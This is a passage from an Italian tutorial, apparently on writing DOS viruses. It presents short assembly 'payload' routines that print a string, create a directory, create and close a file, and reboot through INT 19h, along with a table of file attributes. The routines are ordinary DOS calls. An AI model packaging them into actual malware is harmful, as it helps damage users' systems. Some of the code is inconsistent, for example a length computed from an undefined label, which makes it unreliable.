<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>PrintStr:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ah,00h<span style="mso-spacerun: yes">         </span>;scrivo caratteri<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>lodsb<span
style="mso-spacerun: yes">              </span>;carico stringoperand in
accumulatore<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>int 17h<span style="mso-spacerun: yes">            </span>;printer
interrupt<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>loop PrintStr<span
style="mso-spacerun: yes">      </span>;loops printstr fino a…<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">       </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>text1Len<span
style="mso-spacerun: yes">       </span>EQU EndStr1-String1<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>text1<span
style="mso-spacerun: yes">     </span>db<span style="mso-spacerun: yes"> 
</span>'testo stampato',0dh,0ah,'$'<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">                  </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>EndStr1:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'>g)
Questo payload crea una directory:<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>create_directory:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>mov ah,39h<span
style="mso-spacerun: yes">                 </span>;funzione crea nuova
directory<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>lea dx, dirname1<span
style="mso-spacerun: yes">           </span>;dx=nome directory (es. dirname1 db
'DOS',0)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span>int 21h<span
style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Nome directory massimo 8 caratteri.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>h) E questo crea un un file:<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes"> </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span></span></b><b><span
lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'>create_new_file:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span lang=EN-US
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:
EN-US'><span style="mso-spacerun: yes">   </span></span></b><b><span
style='mso-fareast-font-family:"MS Mincho";color:#FFCC99'>mov ah,5bh<span
style="mso-spacerun: yes">                 </span>;funzione crea nuovo file (e
lo apre)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>lea dx,
filename<span style="mso-spacerun: yes">           </span>;metto il nome file
in dx (es.filename db <o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun:
yes">                              </span>;'hello.txt',0)<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov cx,
00h<span style="mso-spacerun: yes">                </span>;metto file attribute
in cx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
21h<span style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>close_file:<span
style="mso-spacerun: yes">                </span>;devo chiudere il dopo
creating/opening<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>mov
ah,3eh<span style="mso-spacerun: yes">                 </span>;funzione close
file<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span>int
21h<span style="mso-spacerun: yes">                    </span>;<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>Come da commento è necessario inserire gli attributi
del file in cx:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">   </span></span><span
lang=EN-US style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'>Read
Only:<span style="mso-spacerun: yes">     </span>01h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">   </span>Hidden:<span style="mso-spacerun:
yes">          </span>02h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">   </span>System File:<span style="mso-spacerun:
yes">   </span>04h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">   </span>Volume ID:<span style="mso-spacerun:
yes">    </span>08h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">   </span>Directory:<span style="mso-spacerun:
yes">      </span>10h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">   </span>Archive:<span style="mso-spacerun:
yes">        </span>20h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#FFCC99;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">   </span></span><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>none:<span style="mso-spacerun: yes">           
</span>00h<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><u><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'>i) reboot<o:p></o:p></span></u></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><span style="mso-spacerun: yes"> </span>un payload
molto utilizzato (ma non distruttivo come comunemente si ritiene) è il reboot
del sistema. Viene chiamato l’Int 19h invece di passare il controllo al DOS
back (Int 20h).<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
18.0pt;mso-bidi-font-size:10.0pt;font-family:Albertus;mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#FFCC99'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

</div>

</body>

</html>
